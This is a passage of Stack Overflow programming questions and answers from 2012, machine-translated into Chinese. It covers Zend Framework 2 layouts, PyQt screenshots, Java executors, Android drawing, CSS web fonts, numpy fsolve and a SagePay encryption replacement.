看看普通 git-flow 和这个版本的区别，这个版本主要是为使用 Gerrit 的开发者准备的，我们还没有使用 git-flow 的任何发布功能。

干杯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-15T02:25:53.817

不幸的是没有。

该软件具有硬编码的远程名称参考，例如`refs/heads/$BRANCH`

我刚刚阅读了一个[wiki 页面](http://www.mediawiki.org/wiki/User%3aDAndreescu/GitFlowGerrit)，该页面讨论了集成 git-flow 和 gerrit 的棘手部分。您可能也想阅读它。

# xml - 在 IIS 中反序列化 XML 的性能

> ID：13360019
> 
> 赞同：0
> 
> 时间：2012-11-13T11:32:41.567
> 
> 标签：xml, performance, iis, serialization, xml-serialization

我希望使用一些基本的 xml 文件，大多数不超过 100kb 并将它们序列化/反序列化为对象。这将使用内置在序列化属性/类中的 .NET 框架来完成，而不是将它们保存在数据库中。

我担心如果该网站被多次点击（在一个平衡良好的网络场上），是否可能存在性能问题？返回的数据量和对象/字段的数量不是很大，可能是 10 个对象 - 它们将位于功能强大的虚拟服务器上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:45:24.707

您的应用程序的性能将始终是您的代码和硬件之间的平衡问题。因为您正在构建一个 Web 应用程序，所以使用多线程处理大型工作负载本质上是必要的，因此您可以让多个后台线程执行耗时的作业，从而避免处理 Web 请求的线程性能下降。但是，您的场景看起来并不是什么大问题，即使是现在的普通笔记本电脑，当您当前的服务器可以很好地处理简单的任务时，请确保您不会过度设计您的应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T11:36:45.617

在不了解您的环境的情况下，我不能说，但我知道处理器周期比 100KB 的内存要贵得多。这些 XML 文件多久会更改一次？如果不经常，您可以考虑将反序列化的对象存储在内存中，因为它只有 100KB。

# ruby-on-rails - 从零到设计的认证

> ID：13360020
> 
> 赞同：0
> 
> 时间：2012-11-13T11:32:44.450
> 
> 标签：ruby-on-rails, ruby-on-rails-3, devise

我想从我按照 Ruby on Rails 教程 (Michael Hartl) 从头开始​​构建的身份验证转变为将 Devise 与 CanCan 和 Rolify 一起使用。这样做的最佳方法是什么？我应该删除已经存在的用户模型并让 Devise 生成一个吗？我必须修改迁移文件吗？我应该如何处理我为用户编写的测试？感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:39:56.903

我首先禁用您的解决方案的身份验证检查，然后添加设计。Devise 可以与您预先存在的模型一起使用，因此您无需删除它。到目前为止，您创建的迁移也很好，您只需要运行设计的迁移即可。您必须注意测试中的设计更改，但这非常简单且有据可查。最好通过 devise 的[优秀 wiki](https://github.com/plataformatec/devise/wiki/_pages)来获取详细信息。祝你好运！

# java - 在android中移动圆圈

> ID：13360021
> 
> 赞同：1
> 
> 时间：2012-11-13T11:32:54.183
> 
> 标签：java, android

我有一个任务。它是在屏幕上绘制一些（多个）圆圈。单击它们后，它们必须开始移动。我只有一个圆圈的代码。给我怎么做这个任务的方法，比如5圈。提前致谢！

```
public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(new MyView(this));
    }

    class MyView extends View {
        //public    Paint c;
        public  Paint p;

        private static final int RADIUS = 46;

        private int centerX;
        private int centerY;
        private int speedX = 50;
        private int speedY = 40;
        //private Paint paint; // Создай его где-нибудь там в конструкторе

        public MyView(Context context) {
            super(context);
            p = new Paint();
            p.setColor(Color.GREEN);
        }

        @Override
        protected void onSizeChanged(int w, int h, int oldW, int oldH) {
            centerX = w / 2;
            centerY = h / 2;
        }

        protected void onDraw(Canvas c) {
            int w = getWidth();
            int h = getHeight();
            centerX += speedX;
            centerY += speedY;
            int rightLimit = w - RADIUS;
            int bottomLimit = h - RADIUS;

            if (centerX >= rightLimit) {
                centerX = rightLimit;
                speedX *= -1;
            }
            if (centerX <= RADIUS) {
                centerX = RADIUS;
                speedX *= -1;
            }
            if (centerY >= bottomLimit) {
                centerY = bottomLimit;
                speedY *= -1;
            }
            if (centerY <= RADIUS) {
                centerY = RADIUS;
                speedY *= -1;
            }

            c.drawCircle(centerX, centerY, RADIUS, p);
            postInvalidateDelayed(200);  
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:39:13.730

你必须改变这部分：

```
 private int centerX;
  private int centerY;
  private int speedX = 50;
  private int speedY = 40; 
```

并将其转换为

```
class Circle {
  private int centerX;
  private int centerY;
  private int speedX = 50;
  private int speedY = 40;
  // add constructor here and other things
}; 
```

然后收集你的圈子：`ArrayList<Circle> circles`，然后代替

```
centerX += speedX;
centerY += speedY;
int rightLimit = w - RADIUS;
int bottomLimit = h - RADIUS;

if (centerX >= rightLimit) {
  centerX = rightLimit;
  speedX *= -1;
}
if (centerX <= RADIUS) {
  centerX = RADIUS;
  speedX *= -1;
}
if (centerY >= bottomLimit) {
  centerY = bottomLimit;
  speedY *= -1;
}
if (centerY <= RADIUS) {
  centerY = RADIUS;
  speedY *= -1;
} 
```

你必须为每个圈子都这样做，比如

```
for( i=0; i<circles.size(); i++) {
    circles[i].centerX += circles[i].speedX;
    circles[i].centerY += circles[i].speedY;

    // и так далее... 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T11:40:08.187

您需要使用不同的 centerx、centerY、Radius 和 p 调用 draw circle 5 次

# python - PyQT 的伪透明

> ID：13360027
> 
> 赞同：2
> 
> 时间：2012-11-13T11:33:23.997
> 
> 标签：python, pyqt, transparency, screenshot

我想通过使用 PyQt 截取窗口后面的内容来创建一个伪透明窗口。以下代码截图：

```
#!/usr/bin/python3

from PyQt4.QtGui import *

app = QApplication([])
widget = QWidget()
widget.setLayout(QVBoxLayout())
label = QLabel()
widget.layout().addWidget(label)

def shoot():
    geometry = widget.geometry()
    widget.hide()
    label.setPixmap(QPixmap.grabWindow(QApplication.desktop().winId(), x = geometry.x(), y = geometry.y(), height = geometry.height(), width = geometry.width())
    widget.show()

widget.layout().addWidget(QPushButton('Screenshot', clicked = shoot))
widget.show()
app.exec_() 
```

但是，尽管有 widget.hide()，窗口本身出现在屏幕截图上。我怎样才能避免这种情况？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-01-27T16:49:58.880

这是我写的东西，基本上可以满足您的需求。它使用可调整大小的 Qt 窗口来截取其背后的任何内容。到目前为止，此脚本仅适用于 1 个屏幕。深入研究`QScreen`并`QApplication`可能会给您答案以使其可扩展。

```
import sys
import io
from PySide2.QtWidgets import QApplication, QWidget, QPushButton
from PySide2.QtCore import Qt, QBuffer
from PIL import Image

class Screenshooter(QWidget):
    def __init__(self, parent):
        super().__init__()
        self.parent = parent
        self.setAttribute(Qt.WA_TranslucentBackground, True)
        self.resize(640, 480)
        self.snapBtn = QPushButton("Capture", self)
        self.snapBtn.clicked.connect(self.take_screenshot)
        self.show()

    def take_screenshot(self):
        geometry = self.geometry()
        screen = self.parent.screenAt(self.pos())
        full_screenshot = screen.grabWindow(
            0,
            geometry.x(),
            geometry.y(),
            geometry.width(),
            geometry.height()
        )
        full_image = full_screenshot.toImage()
        buffer = QBuffer()
        buffer.open(QBuffer.ReadWrite)
        full_image.save(buffer, 'PNG')
        im = Image.open(io.BytesIO(buffer.data()))
        im.show()
        buffer.close()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    widget = Screenshooter(app)
    sys.exit(app.exec_()) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T18:59:11.007

我认为与其睡不知道的时间，`app.processEvents()`还应该工作。这会强制 Qt 应用程序在继续之前完成正在进行的事情——例如隐藏小部件。[**这**](https://stackoverflow.com/questions/8608557/resizing-a-dialog-with-pyqt4)是一个相关问题，在其中一个答案中对此进行了讨论。

# java - java中ExecutionService中的超时和取消任务

> ID：13360031
> 
> 赞同：0
> 
> 时间：2012-11-13T11:33:36.117
> 
> 标签：java, multithreading

我需要并行执行一些任务，这样主调用线程就不会被阻塞。如果发生超时，每个任务都将被终止，如果用户改变主意，我将能够一次取消所有任务。

我想出的是：

主线程调用新的 DownloadWatcherThread（所以它不会被阻塞）。DownloadWatcherThread 有这样的运行方法：

```
public void run() {
    executorService = Executors.newFixedThreadPool(numberOfThreads);
    futures = new ArrayList<Future>();
    for(Component component: components) {

        PackageDownloader downloader = new PackageDownloader(component);
        futures.add(executorService.submit(downloader));
    }

    for(Future future: futures){
        try {
            future.get(8, TimeUnit.HOURS);
        } catch(Exception e) {
            future.cancel(true);
        }
    }

    executorService.shutdown();
}

public void cancelTasks(){      
    executorService.shutdownNow();
} 
```

那么，问题是这是实现所有 3 种成分的正确方法吗？

1.  不阻塞调用线程
2.  如果需要很长时间，则超时任务
3.  如果用户愿意，可以取消整个事情

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:06:14.547

几点评论：

*   您当前的设计将阻塞，直到第一次下载完成，然后是第二次，依此类推。如果第一次下载需要整整八个小时，那么您可能错过了对其他下载完成做出反应的机会。如果这是一个问题，您可能需要重新设计。

*   您的`cancelTasks`方法仅依赖执行程序服务来停止线程。您对`PackageDownloader`尊重线程中断有信心吗？如果没有，那么您的线程可能实际上不会停止。

您可能希望在[https://codereview.stackexchange.com/](https://codereview.stackexchange.com/)上发布您的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:08:41.973

您可以使用[ExecutorCompletionService](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/ExecutorCompletionService.html)来处理已完成的未来任务的排队。使用[poll()](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/ExecutorCompletionService.html#poll%28%29)方法轮询已完成的任务。

# javascript - Firefox中的同步AJAX请求焦点错误元素

> ID：13360035
> 
> 赞同：0
> 
> 时间：2012-11-13T11:33:45.710
> 
> 标签：javascript, ajax, firefox

我有一个奇怪的错误，我不明白出了什么问题。在我的应用程序中处理`TAB`键时，如果我在事件处理程序中执行同步 AJAX 请求，Firefox 会将焦点放在错误的元素上。

我设法在这里制作了一个简单的测试用例：http: [//jsfiddle.net/aVeQp/18/](http://jsfiddle.net/aVeQp/18/)

如果单击结果部分然后按 Tab，前两次它可以正常工作（转到下一个单元格），但最后一次，它将焦点放在“home”元素上。如果您将查询更改为异步，则焦点不会转到主页按钮。

```
var ret = $.ajax({
            type: 'POST',
            url: "",
            data: { action: "test"},
            datatype: "xml",
            async: false
            }); 
```

这在 Linux 下不会发生，但我在 Windows 7 64 位下遇到 Firefox 16.0.2 的错误。

我知道 ajax 调用在 jsfiddle 上无法正常工作，但是该错误发生在我自己的安装中，并且 ajax 调用正确返回它只是为了显示代码和错误。我尝试使用 dhtmlx 的 AJAX 请求并且发生了同样的错误。

有谁知道我做错了什么？我已经尝试了很多东西，在这种特定情况下，firefox 似乎并不关心停止事件的传播。

编辑：似乎我在以前的测试中做错了什么，而 setTimeout() 最终是一个可行的解决方案。但我仍然认为它最终应该在没有这种“黑客”的情况下工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:19:56.627

我没有复制所需的环境，但我有一个可能对你有用的长期建议。尝试将ajax调用包装在里面

> setTimeout(function() { 你的电话在这里}, 1);

看看情况如何。

编辑：

将回调绑定到 ajax

> $.ajax().done(function (data) { console.log(data); });

# layout - Zend Framework 2 - 布局和变量

> ID：13360040
> 
> 赞同：24
> 
> 时间：2012-11-13T11:34:35.083
> 
> 标签：layout, zend-framework2

我的所有视图都使用了一个布局，我需要将一个变量从控制器分配给这个布局，如果我在控制器上使用这个方法它不起作用：

```
public function indexAction()
{
    return new ViewModel( array(
        'testvar' => 'bla',
    ));
} 
```

任何人都可以帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：67
> 
> 时间：2013-01-24T10:26:34.057

在 ZF2 中（在您的控制器中）有三种方法可以实现此目的：

第一的：

```
$this->layout()->someVariableName = 'Some value for the variable'; 
```

第二：

```
$this->layout()->setVariable('someVariableName', 'Some value for the variable'); 
```

第三：

```
$this->layout()->setVariables(array(
    'someVariableName' => 'Some value for the variable',
    'anotherVariable'  => 'Some value for another variable',
); 
```

* * *

## 回答 #2

> 赞同：39
> 
> 时间：2012-11-13T12:24:29.230

Rob Allen 发表了[一篇](http://akrabat.com/zend-framework-2/access-view-variables-in-another-view-model/)关于如何在另一个视图模型中访问视图变量的精彩文章（例如：布局）

基本上，放置在 layout.phtml 中的以下代码将满足您的需求：

```
<?php
$children = $this->viewModel()->getCurrent()->getChildren();
$child = $children[0];
?>
<!-- some HTML -->
<?php echo $this->escape($child->myvar);?> 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-11-13T13:50:11.607

你有没有尝试过：

```
$this->layout()->testvar = 'bla'; 
```

使用`layout`控制器插件，您可以检索在`layout.phtml`.

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-14T06:14:33.340

因为ZF2 ViewModel是树形结构，所以layout其实是ViewModel的根节点，你控制器中的ViewModel会被添加为layout的子节点。

你可以通过访问 MvcEvent 来访问布局 ViewModel，在你的控制器中试试这个：

```
public function indexAction()
{
    $events = $this->getServiceLocator()->get('Application')->getEventManager();
    $events->attach(MvcEvent::EVENT_RENDER, array($this, 'setVariableToLayout'), 100);
}

public function setVariableToLayout($event)
{
    $viewModel = $this->getEvent()->getViewModel();
    $viewModel->setVariables(array(
        'testvar' => 'bla',
    ));
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-13T12:31:11.943

请参阅下面的添加视图变量部分

将它添加到你的 module.php 文件中。

您也可以使用视图助手来执行此操作。

```
/**
     * Remember to keep the init() method as lightweight as possible
     * 
     * @param \Zend\ModuleManager\ModuleManager $moduleManager
     */
    public function init(ModuleManager $moduleManager) 
    {        
        $events = $moduleManager->getEventManager();
        $events->attach('loadModules.post', array($this, 'modulesLoaded'));
        $events->attach('onBootstrap', array($this, 'bootstrap'));

        $sharedEvents = $events->getSharedManager();
        $sharedEvents->attach(__NAMESPACE__, 'bootstrap', array($this, 'bootstrap'), 100);
        $sharedEvents->attach(__NAMESPACE__, 'bootstrap', array($this, 'initializeView'), 100);
        $sharedEvents->attach(__NAMESPACE__, 'dispatch', array($this, 'addViewVariables'), 201);        
    }

/**
 * 
 * @param \Zend\Mvc\MvcEvent $e
 */
public function loadConfiguration(MvcEvent $e) 
{        
    $e->getApplication()->getServiceManager()
            ->get('ControllerPluginManager')->get('AclPlugin')
            ->checkAcl($e); //Auth/src/Auth/Controller/AclPlugin      
}

/**
 * 
 * @param \Zend\EventManager\EventInterface $e
 */
public function bootstrap(Event $e) {

    $eventManager = $e->getParam('application')->getEventManager();
    //$app->getEventManager()->attach('dispatch', array($this, 'checkAcl'), 100);
}

/**
 * pass variables to layout
 * 
 * @param \Zend\EventManager\EventInterface $e
 */
public function addViewVariables(Event $e) 
{
    $route = $e->getRouteMatch();
    $viewModel = $e->getViewModel();
    $variables = $viewModel->getVariables();
    if (false === isset($variables['controller'])) {
        $viewModel->setVariable('controller', $route->getParam('controller'));
    }
    if (false === isset($variables['action'])) {
        $viewModel->setVariable('action', $route->getParam('action'));
    }

    $viewModel->setVariable('module', strtolower(__NAMESPACE__));        
}

/**
 * 
 * @param \Zend\Mvc\MvcEvent $e
 */
public function initializeView(Event $e) 
{

} 
```

并且在您的布局中，您可以根据上面的示例使用它们的名称简单地访问这些变量，例如 $module、$action、$controller

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-01-30T11:52:55.657

如果您想在全局范围内将值传递给您的布局，那么您可以参考：[https ://stackoverflow.com/a/21455737/2190889](https://stackoverflow.com/a/21455737/2190889)

# javascript - 开发人员工具查找已执行的 javascript

> ID：13360044
> 
> 赞同：0
> 
> 时间：2012-11-13T11:34:44.960
> 
> 标签：javascript, firebug, visual-web-developer

有没有一种简单的方法可以找到 javascript 文件或函数，例如在点击时执行？有没有办法知道这个href链接有事件和功能等等？

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:37:50.450

看看[http://www.sprymedia.co.uk/article/Visual+Event+2](http://www.sprymedia.co.uk/article/Visual+Event+2)。它几乎可以满足您的需求。

# android - 如何在Android中提供文本与其透明背景边缘之间的相等距离

> ID：13360053
> 
> 赞同：0
> 
> 时间：2012-11-13T11:35:17.360
> 
> 标签：android, android-layout, textview

我有一些像这样的透明背景文本

![在此处输入图像描述](../Images/04fed0f7e84aa2d59c911733e258b78e.png)

现在，当文本很小时，它看起来不错并且居中（我也有 android:minWidth="150dip"），但由于文本很大时它是 wrap_content

![在此处输入图像描述](../Images/c6f08299d158afef2c1ae6271683520d.png)

它像这样包裹。

有没有一种方法我可以在背景边缘和文本之间始终保持恒定的空间，并且使文本居中（一旦侧面固定，这将很明显）这是我的文本 xml

```
 <TextView
                android:id="@+id/title2"
                android:layout_width="wrap_content"
                android:layout_height="30dp"
                android:layout_marginLeft="10dp"
                android:layout_marginTop="10dp"
                android:layout_weight="1"
                android:background="@drawable/tocheader"
                android:gravity="center_vertical|center_horizontal"
                android:minWidth="150dip"
                android:text="example"
                android:textColor="#ffffff"
                android:textSize="18dp"
                android:textStyle="bold" /> 
```

而且`@drawable/tocheader`只是

```
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android"
    android:padding="10dp"
    android:shape="rectangle" >

    <solid android:color="#88000000" />

</shape> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:43:23.680

使用填充而不是边距...
边距为您提供此视图与周围环境之间的空间，而没有“此视图”的任何属性。
填充为您提供此视图和周围所有“此视图”属性之间的空间。

# ruby-on-rails - Bootstrap 动态主动导航

> ID：13360057
> 
> 赞同：2
> 
> 时间：2012-11-13T11:35:27.203
> 
> 标签：ruby-on-rails, twitter-bootstrap, navigation, haml

我正在使用此代码进行导航：

```
.row-fluid
    .span3
      .well
        %ul.nav.nav-tabs.nav-stacked
          %li.nav-header
            Menu
          %li
            %a{:href => "/cms/1"} page1
          %li
            %a{:href => "/cms/2"} page2
          %li
            %a{:href => "/cms/3"} page3
          %li
            %a{:href => "/cms/4"} page4 
```

如果我把它`.active`放在`%li`它使项目处于活动状态，我怎样才能动态地做到这一点，以便它反映哪个页面当前处于活动状态？我已经安装了所有的引导 javascript 文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-24T19:37:16.347

看看[如何让 Twitter-Bootstrap 导航显示活动链接？](https://stackoverflow.com/questions/9879169/how-to-get-twitter-bootstrap-navigation-to-show-active-link).

在那个问题中，有很多“自动检测”当前页面的替代方法，因此可以轻松地在相关菜单项上设置活动类。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:26:37.680

您可以像这样创建一个辅助函数：

```
def active_navigation(item, param)
  "class='active'" if params[param] == item
end 
```

然后在你看来，你放了这样的东西：

```
%li.nav-header
  Menu
%li{:class => active_navigation(1, :id)}
  %a{:href => "/cms/1"} page1
%li{:class => active_navigation(2, :id)}
  %a{:href => "/cms/2"} page2
%li{:class => active_navigation(3, :id)}
  %a{:href => "/cms/3"} page3
%li{:class => active_navigation(4, :id)}
  %a{:href => "/cms/4"} page4 
```

我只是不知道/讨厌`haml`，所以我认为语法不正确。但我确实认为这是一个很好的例子，您可以尝试适应自己的领域。

# javascript - 如何以日期格式设置当前机器的区域？

> ID：13360059
> 
> 赞同：0
> 
> 时间：2012-11-13T11:35:37.093
> 
> 标签：javascript, vb.net

我在 VB.net 项目中工作，我想要更改日期中的区域“GMT”以将其发送到另一个应用程序。这样当目的地得到这个日期时，它就可以找到该区域。所以我想将日期区域修改为我想要的任何区域

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T11:54:21.870

在这里寻找转换时区。但是它在 C# 中，但将其转换为 VB.Net 很简单：http: [//blogs.msdn.com/b/bclteam/archive/2006/10/03/system.timezone2-starter-guide-_5b00_kathy-kam_5d00_ .aspx](http://blogs.msdn.com/b/bclteam/archive/2006/10/03/system.timezone2-starter-guide-_5b00_kathy-kam_5d00_.aspx)

# css - 字体上的字体粗细不起作用？

> ID：13360061
> 
> 赞同：0
> 
> 时间：2012-11-13T11:35:48.190
> 
> 标签：css, font-face, webfonts

我正在尝试使文本更薄，并且我已经看到它在网站上正常工作。 [http://www.freshthemes.net/demo/backbone/about-us/](http://www.freshthemes.net/demo/backbone/about-us/)（下`company overview`）

这是我正在使用的风格：

```
.intro p{
    text-align: justify;
    margin-bottom: 8px;
    line-height: 22px;
    margin-bottom: 8px;
    font: 17px/21px "Open Sans", Arial, "HelveticaNeue", "Helvetica Neue", Helvetica, sans-serif;
    font-style: normal;
    font-variant: normal;
    font-weight: 300;
    color:#656565;
} 
```

字体加载：

```
<link rel='stylesheet' id='google_webfont_OpenSans-css'  href='http://fonts.googleapis.com/css?family=Open+Sans' type='text/css' media='all' /> 
```

事情，`font-weight`财产似乎没有任何影响。不介意我是否将其设置为 300。（它不应该，在以前的网站上它的工作）

这是我的身体：

```
<div class="intro">
    <p>
        This is the text that should be thinner
    </p>
</div> 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-13T11:41:02.203

您没有加载每个字体权重。你应该尝试这样的事情：

```
<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800' rel='stylesheet' type='text/css'> 
```

您可以通过检查您需要的所有字体在此 google 页面上对其进行自定义（但如果您加载的字体过多，请注意网站速度！）： [http ://www.google.com/webfonts#UsePlace:use/合集：Open+Sans](http://www.google.com/webfonts#UsePlace:use/Collection:Open+Sans)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T11:42:54.243

为了使用不同权重的网络字体，您必须将其包含在您的 中`<link>`，方法是将您的权重添加到字体名称的末尾，如下所示：

```
<link rel='stylesheet' id='google_webfont_OpenSans-css' ref='http://fonts.googleapis.com/css?family=Open+Sans:400,300' type='text/css' media='all' /> 
```

虽然每个这样的添加都会使您的页面加载更重，但要厌倦使用太多字体权重加载太多字体

# python - Python 曲线与 fsolve() 的交集和使用 numpy 的函数参数

> ID：13360062
> 
> 赞同：6
> 
> 时间：2012-11-13T11:35:48.433
> 
> 标签：python, numpy, intersection, curves

我正在尝试使用此处引用的 fsolve：http: [//glowingpython.blogspot.gr/2011/05/hot-to-find-intersection-of-two.html](http://glowingpython.blogspot.gr/2011/05/hot-to-find-intersection-of-two.html)，

为了找到两条曲线之间的交点。两条曲线基本上都是两个浮点数组。

其中第一个是一维数组`Pmech ( Pmech(x) )`，第二个是二维数组`Pair ( Pair(x,y) )`

x 轴对于两个数组都是通用的，所以我想要做的是让每个 y 看到 Pair 和 Pmech 相交的位置。

我知道`fsolve()`作为参数的函数，而不是数组，所以我写了两个基本函数来实现这个特性：

```
def Pmix(x):
    return Pmech[x]

def Paera(x,y):
    return Pair[x,y] 
```

因此，如上面的链接所示，我实现了该`findIntersection`功能：

```
def findIntersection(fun1,fun2,x0): 
    return fsolve(lambda x: (fun1(x) - fun2(x,y) for y in range(1,100)),x0) 
```

但我收到以下错误：

```
TypeError: float() argument must be a string or a number
Traceback (most recent call last):
  File "batteries.py", line 261, in <module>
    findIntersection(Pmix,Paera,0)
  File "batteries.py", line 238, in findIntersection
    fsolve(lambda x: (fun1(x) - fun2(x,y) for y in range(1,100) ),x0)
  File "/usr/lib/python2.7/dist-packages/scipy/optimize/minpack.py", line 125, in fsolve
    maxfev, ml, mu, epsfcn, factor, diag)
minpack.error: Result from function call is not a proper array of floats. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T11:52:15.530

```
from scipy.optimize import fsolve

def pmix(x):
    return x

def paera(x, y):
    return x**2 - y**2

def findIntersection(fun1, fun2, x0):
    return [fsolve(lambda x:fun1(x)-fun2(x, y), x0) for y in range(1, 10)]

print findIntersection(pmix, paera, 0) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-13T11:53:21.243

看来，在您的示例中，如果没有`fsolve`：

```
import numpy as np
pair = np.array(pair)
pmech = np.array(pmech)

intersect_x=np.abs(pair-pmech[:,None]).argmin(0) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T15:11:26.590

`(fun1(x) - fun2(x,y) for y in range(1,100))`

是一个发电机

`[fun1(x) - fun2(x,y) for y in range(1,100)]`

是一个列表。你需要后者。

但是，正如 btel 在另一个答案中提到的那样，对于数组中的交集，您不能只重用用于查找函数交集的代码。

# java - 在 Java 应用程序中嵌入 XML 模式

> ID：13360076
> 
> 赞同：1
> 
> 时间：2012-11-13T11:36:49.667
> 
> 标签：java, xml, schema, embed

有没有办法在 Java 应用程序中嵌入 XML Schema 以使其无法更改（仅由应用程序使用）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:41:59.987

您可以在程序中包含 XML Schema 文件的哈希，并在加载文件后验证它是否正确。

但是请注意，足智多谋的攻击者可能能够反编译您的程序并更改预期的哈希值以允许加载他的模式。取决于您的程序将在其中部署的环境。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:03:38.883

对于您声明的要求级别，将您的模式和代码捆绑在一个 JAR 中就足够了。由于客户端无法更改内容（无意图），这可以满足您的需求。现在，这并不能阻止任何人解压存档并手动运行应用程序，但实际上，一旦它“在野外”出现，你无法阻止一个坚定的黑客对你的二进制文件做他们想做的事情。

您没有提到您是如何使用 XML 模式的，但是对于大多数绑定框架，可以在运行时针对模式验证编组/解组操作。阅读此 SO 帖子以获取一般 JAXB 示例：

[如何在不编组的情况下验证 JAXB 2.0 中的模式？](https://stackoverflow.com/questions/1560422/how-to-validate-against-schema-in-jaxb-2-0-without-marshalling)

# ruby-on-rails - 100% 车身高度，带 Twitter Bootstrap 和固定导航栏

> ID：13360077
> 
> 赞同：0
> 
> 时间：2012-11-13T11:36:53.027
> 
> 标签：ruby-on-rails, ruby-on-rails-3, twitter-bootstrap

我正在使用带有固定导航栏的 Twitter Bootstrap，所以我有以下 HAML 和 CSS：

HAML

```
%html
  %body
    %header
      .navbar
        ...
    #main-wrapper
      .container
    %footer 
```

CSS

```
body { 
  padding-top: 60px 
  height: 100%;
} 
```

问题是这会创建一个比页面高度大 60px 的正文，所以我总是在页面上有一个滚动条，即使它不需要显示内容。我需要 60px 的填充，以便响应行为正常工作。

有什么方法可以保持这种填充并仍然达到 100% 的身高？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:47:59.847

你可以尝试这样的事情：

```
<body>
  <div style='height: 100%; background:blue;'>
    <div style='height: 60px; background:red;'>
    </div>
  </div>
</body> 
```

让封闭的 div 具有 100% 的高度，并添加一些内部元素来创建填充。

# php - Windows 服务器上 sagepay 的 php mcrypt 等效项

> ID：13360079
> 
> 赞同：1
> 
> 时间：2012-11-13T11:36:55.843
> 
> 标签：php, encryption, mcrypt, opayo

直到最近，当我们开始改用 PHP 时，我们公司主要使用 vbscript。在尝试将 SagePay 表单工具包集成到我们的一个项目中时，我遇到了这个障碍。

我们在 Windows 2008 服务器上，这是无法更改的。服务器不包含 mcrypt 库，我们的服务器主机不会安装它，因为它是一个共享平台。

有问题的行来自您用来通过 SagePay 支付费用的 SagePay 表单工具包。希望你们中的一些人会熟悉这些。

有问题的行是：

```
//** perform encryption with PHP's MCRYPT module
$strCrypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $strEncryptionPassword, $strIn, MCRYPT_MODE_CBC, $strIV); 
```

这是一个更大的加密函数的一部分，如下所示：

```
//** Wrapper function do encrypt an encode based on strEncryptionType setting **
function encryptAndEncode($strIn) {

    global $strEncryptionType
          ,$strEncryptionPassword;

    if ($strEncryptionType=="XOR") 
    {
        //** XOR encryption with Base64 encoding **
        return base64Encode(simpleXor($strIn,$strEncryptionPassword));
    } 
    else 
    {
        //** AES encryption, CBC blocking with PKCS5 padding then HEX encoding - DEFAULT **

        //** use initialization vector (IV) set from $strEncryptionPassword
        $strIV = $strEncryptionPassword;

        //** add PKCS5 padding to the text to be encypted
        $strIn = addPKCS5Padding($strIn);

        //** perform encryption with PHP's MCRYPT module
        $strCrypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $strEncryptionPassword, $strIn, MCRYPT_MODE_CBC, $strIV);

        //** perform hex encoding and return
        return "@" . bin2hex($strCrypt);
    }
} 
```

有谁知道我如何能够绕过这个问题，或者我可以在其位置实现的等效库？任何指向正确方向的指针、提示或点将不胜感激。

**编辑**好的，所以在研究了更多之后，据我了解，我只需要一个 128 位 AES 加密功能，而不使用 mcrypt。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:12:32.330

本机扩展的替代方案是 phpseclib

[http://phpseclib.sourceforge.net/](http://phpseclib.sourceforge.net/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T13:04:34.063

有很多替代方案，您的软管供应商缺乏支持/意愿将是关键点。

如果您在自己的 VPS 上/有能力走一条新路线。我推荐 OpenSSL；[http://www.openssl.org/](http://www.openssl.org/) - 因为你在 Windows 上，所以可以查看[http://slproweb.com/products/Win32OpenSSL.html](http://slproweb.com/products/Win32OpenSSL.html)

你有没有检查过你`phpinfo()`可以使用什么？

还有PCrypt； [http://www.phpclasses.org/package/1610-PHP-Symetric-encryption-of-data-using-only-PHP-code.html](http://www.phpclasses.org/package/1610-PHP-Symetric-encryption-of-data-using-only-PHP-code.html)

# ruby-on-rails - rake 资产的详细输出：预编译

> ID：13360085
> 
> 赞同：26
> 
> 时间：2012-11-13T11:37:43.133
> 
> 标签：ruby-on-rails, logging, heroku, precompile

